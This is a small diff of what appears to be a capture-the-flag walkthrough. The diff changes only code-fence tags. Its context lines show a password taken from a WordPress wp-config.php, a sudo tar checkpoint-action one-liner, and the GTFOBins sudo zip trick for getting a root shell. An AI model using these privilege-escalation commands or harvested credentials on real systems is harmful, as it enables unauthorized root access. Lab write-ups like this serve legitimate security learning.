@@ -107,7 +107,7 @@ We see a `to_do.txt` file in their home directory, let's take a look. Zico still
 
 It seems that Joomla wasn't set up at all/ or I couldn't find a password inside there. However, we see a `wp-config.php` in the Wordpress directory. This one has a password stored:
 
-```txt
+```
 sWfCsfJSPV9H3AmQzw8
 ```
 
@@ -139,7 +139,7 @@ $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/
 
 We'll use [this](https://gtfobins.github.io/gtfobins/zip/) resource.
 
-```txt
+```
 TF=$(mktemp -u)
 sudo zip $TF /etc/hosts -T -TT 'sh #'
 #
